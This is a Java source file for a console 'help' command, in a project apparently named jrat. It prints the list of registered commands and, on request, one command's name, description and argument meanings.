package net.jrat.core.command.commands;

import net.jrat.core.command.Command;
import net.jrat.utils.Formatter;
import net.jrat.utils.Logger;

public class Help extends Command
{
	public Help()
	{
		super("help", new String[] { "-command" }, new String[] { "sets the command" }, "shows you some help");
	}

	@Override
	public void execute(String[] arguments) throws Exception
	{
		final String commandName = Formatter.getValue(arguments, "-command=").defaultTo(null);
		
		if(commandName == null)
		{
			Logger.log("see all commands below");
			{
				Logger.startFrequence();
				
				for(Command command : this.server.commandManager.commands)
				{
					final String line = command.name + " - " + command.description + " | type \"help -command=" + command.name + "\" for more information";
					Logger.log(line);
				}
				
				Logger.stopFrequence();
			}
			Logger.log("thats all");
		}
		else
		{
			final Command command = this.server.commandManager.getCommand(commandName);
			
			Logger.log("showing help for " + command.name);
			{
				Logger.startFrequence();
				
				Logger.log("name: " + command.name);
				Logger.log("description: " + command.description);
				
				Logger.space();
				
				Logger.log("arguments");
				{
					Logger.startFrequence();
					
					for(int i = 0; i < command.arguments.length; i++)
					{
						final String argument = command.arguments[i];
						String meaning = "";
						
						for(int j = 0; j < command.meanings.length; j++)
						{
							if(j == i)
							{
								meaning = command.meanings[i];
								break;
							}
						}
						
						Logger.log(argument + " | " + meaning);
					}
					
					Logger.stopFrequence();
				}
				Logger.log("arguments");
				
				Logger.stopFrequence();
			}
			Logger.log("done");
		}
	}
}
